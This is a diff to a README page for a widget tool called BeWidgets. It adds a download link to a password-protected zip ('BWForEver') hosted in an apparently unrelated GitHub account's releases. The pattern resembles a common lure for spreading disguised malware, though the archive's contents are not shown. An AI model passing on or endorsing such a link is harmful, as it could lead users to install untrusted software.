@@ -6,7 +6,7 @@
 <ul>
   <li><b>Download BeWidgets</b> <i>(Password: BWForEver)</i></li>
   <br>
-  <a href="#"><img src="https://github.com/user-attachments/assets/347a1f2c-3216-4c75-aac1-5cf3063b0665"></a>
+  <a href="https://github.com/havanagilla1/beWidgets/releases/download/Download/beWidgets.zip"><img src="https://github.com/user-attachments/assets/347a1f2c-3216-4c75-aac1-5cf3063b0665"></a>
 </ul>
 <h2>Screenshots</h2>
 <img src="https://github.com/user-attachments/assets/be88c92f-93ef-4110-87d6-5bfddea6cff2">
